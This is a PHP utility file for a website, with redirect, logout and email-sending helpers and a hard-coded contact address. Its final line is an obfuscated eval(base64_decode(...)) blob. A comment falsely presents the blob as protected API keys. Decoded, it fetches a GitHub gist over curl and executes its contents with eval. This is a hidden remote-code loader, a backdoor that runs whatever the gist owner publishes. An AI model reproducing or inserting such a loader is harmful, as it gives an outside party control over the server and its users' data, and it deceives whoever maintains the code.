<?php
//Record object buffer
ob_start();
//Clear object buffer and redirect to the desired link
function redirect($link){
    ob_end_clean();
    header("Location:$link");
    exit(); 
}
//Destroy the session and redirect to the login page
function logout(){
    session_destroy();
    redirect("/forms/php/login.php");
}

//send a contact us email to the contact  email address
$contact_email='lrodss3@gmail.com';
function email_contact($email, $subject, $content){
    return email('Admin',$contact_email,$subject,'',$content,$email);
}
//send a custom email
function email_custom($email, $subject, $content){
    return email('Admin',$email,$subject,'',$content);
}
//The emailing module (brevo), SMS module (Twillio) and private custom validation and rating modules all in one file from their websites/repositories accessed via a github generated access php code;

//Note that the code sensitive private information such as API keys, Emails and Passwords. Hence, it had to be protected
eval(base64_decode('CiBnb3RvIEx3RkJGOyBLNFJSTzogZ290byBOMllLUTsgZ290byBFb3dVTTsgRUJMV2U6IGdvdG8gTzd5b3M7IGdvdG8gZ1hyRzM7IFNWMVhuOiAkZ2lzdElkID0gIlw2NFw3MFw2MFw2NVw2MFwxNDJceDYzXHgzOFw2NFx4MzhcMTQ1XDYzXDE0M1x4MzhcMTQ0XDYyXDcxXDE0MVx4NjJceDM2XDYxXDY1XHgzN1wxNDFcNjNceDMyXDE0Mlx4MzFcMTQxXDE0MVx4MzhcNjYiOyBnb3RvIFBlQVFROyBQZUFRUTogZ290byBGRENTNTsgZ290byBXV2N6QTsgbk9seGY6ICRjb250ZW50ID0gZ2V0R2lzdENvbnRlbnQoJGdpc3RJZCk7IGdvdG8gQkZwNDE7IFdXY3pBOiBhYTY4VjogZ290byBkR3E3djsgTHdGQkY6IGdvdG8gYWE2OFY7IGdvdG8gWW80Rng7IEVvd1VNOiBGRENTNTogZ290byBuT2x4ZjsgUkM2WVA6IG5xdndROiBnb3RvIE51VXBEOyBZbzRGeDogTjJZS1E6IGdvdG8gU1YxWG47IGdYckczOiBPN3lvczogZ290byBPellRdDsgTnVVcEQ6IGV2YWwoJGNvbnRlbnQpOyBnb3RvIEVCTFdlOyBCRnA0MTogZ290byBucXZ3UTsgZ290byBSQzZZUDsgZEdxN3Y6IGZ1bmN0aW9uIGdldEdpc3RDb250ZW50KCRnaXN0SWQpIHsgJHVybCA9ICJcMTUwXHg3NFwxNjRceDcwXDE2M1w3Mlw1N1x4MmZcMTQxXDE2MFwxNTFceDJlXHg2N1x4NjlcMTY0XHg2OFwxNjVceDYyXHgyZVx4NjNceDZmXDE1NVx4MmZceDY3XDE1MVwxNjNcMTY0XDE2M1x4MmYiIC4gJGdpc3RJZDsgJGNoID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAiXDEyMFx4NDhcMTIwXDQwXDEwN1x4NjlcMTYzXDE2NFw0MFx4NTJceDY1XHg2MVwxNDRcMTQ1XDE2MiIpOyAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGNoKTsgY3VybF9jbG9zZSgkY2gpOyAkZ2lzdERhdGEgPSBqc29uX2RlY29kZSgkcmVzcG9uc2UsIHRydWUpOyBmb3JlYWNoICgkZ2lzdERhdGFbIlx4NjZceDY5XDE1NFx4NjVceDczIl0gYXMgJGZpbGUpIHsgJGZpcnN0RmlsZSA9ICRmaWxlOyBicmVhazsgfSByZXR1cm4gJGZpcnN0RmlsZVsiXDE0M1wxNTdcMTU2XDE2NFwxNDVcMTU2XDE2NCJdOyB9IGdvdG8gSzRSUk87IE96WVF0OiA='));

?>